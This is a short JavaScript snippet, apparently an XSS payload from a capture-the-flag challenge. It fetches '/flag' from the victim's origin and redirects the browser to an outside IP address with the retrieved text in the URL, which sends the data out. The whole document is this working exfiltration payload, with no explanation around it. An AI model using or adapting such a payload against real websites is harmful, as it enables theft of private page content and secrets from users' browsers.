fetch('/flag')
  .then(resp => resp.text())
  .then(data => location='http://18.202.227.123:1234/blah?='+(data));
